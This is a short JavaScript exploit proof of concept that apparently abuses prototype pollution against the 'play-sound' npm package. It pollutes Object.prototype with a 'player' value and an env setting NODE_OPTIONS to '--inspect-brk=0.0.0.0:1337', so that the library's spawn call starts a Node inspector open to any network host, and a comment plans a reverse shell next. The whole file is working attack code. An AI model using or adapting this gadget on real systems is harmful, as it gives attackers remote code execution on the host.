const createPlayer = require('play-sound');

Object.prototype.player = 'node'  // or .shell
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell

const player = createPlayer();
player.test();  // `spawn` sink 
